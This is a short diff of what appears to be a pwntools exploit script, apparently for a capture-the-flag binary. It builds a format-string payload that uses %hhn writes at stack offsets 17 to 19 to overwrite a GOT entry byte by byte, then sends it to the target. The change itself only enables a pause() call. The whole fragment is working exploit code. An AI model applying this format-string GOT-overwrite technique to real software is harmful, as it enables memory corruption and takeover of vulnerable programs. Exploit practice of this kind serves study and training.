@@ -63,7 +63,7 @@ system_got=0x602028
 payload=(b'%'+bytes(str(one), encoding='utf-8')+b'c%17$hhn%'+bytes(str(two), encoding='utf-8')+b'c%18$hhn%'+bytes(str(three), encoding='utf-8')+b'c%19$hhn%').ljust(40,b'k')+p64(system_got)+p64(system_got+1)+p64(system_got+2)+p64(0)
 # payload=(b'%'+bytes(str(one), encoding='utf-8')+b'c%15$hhn%').rjust(24,b'k')+p64(system_got)
 print('payload',payload)
-# pause()
+pause()
 # p.interactive()
 p.sendline(payload)
 # p.recvuntil(b'kk')
